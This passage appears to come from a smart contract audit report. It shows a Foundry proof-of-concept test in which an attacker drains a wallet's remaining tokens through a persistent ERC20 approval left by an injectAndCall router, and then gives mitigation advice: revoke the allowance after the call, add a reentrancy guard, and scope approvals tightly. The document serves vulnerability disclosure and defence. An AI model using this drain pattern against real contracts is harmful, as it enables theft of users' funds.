        target = new MaliciousTarget(token, address(wallet), attacker);
    }

    function testPersistentApprovalAllowsDrain() public {
        // 1. Execute a legitimate-looking injectAndCall that spends only half the balance
        bytes memory callData = abi.encodeWithSelector(target.consumeHalf.selector);

        // Simulate any caller triggering the wallet to use the router
        vm.prank(address(0xBEEF));
        wallet.runInjectAndCall(address(token), address(target), callData);

        // Half the tokens were spent during consumeHalf()
        assertEq(token.balanceOf(address(wallet)), 500 ether);

        // 2. Later, attacker calls drain() to use the leftover allowance and steal the rest
        vm.prank(attacker);
        target.drain();

        // Attacker received the remaining 500 tokens, wallet drained
        assertEq(token.balanceOf(attacker), 500 ether);
        assertEq(token.balanceOf(address(wallet)), 0);
    }
}


## Suggested Mitigation
Ensure ERC20 approvals granted during balance injection are strictly scoped to the immediate call and revoked afterwards. Concretely:

- After the external call to target returns successfully in the ERC20 branch of _injectAndExecuteCall, reset the allowance back to zero:

    IERC20 erc20 = IERC20(token);
    SafeERC20.forceApprove(erc20, target, callerBalance);
    (bool success, bytes memory result) = target.call(callData);
    if (!success) revert TargetCallFailed(result);
    // Revoke any leftover allowance
    SafeERC20.forceApprove(erc20, target, 0);

- Optionally, add a reentrancy guard around _injectAndExecuteCall to prevent targets from exploiting the temporary elevated allowance via reentrant calls.

- If some integrations rely on persistent approvals, limit the approved amount to the exact amount that will be spent (e.g. inject the intended spend amount instead of full balance) and/or maintain explicit per-target allowance management rather than approving the full wallet balance.



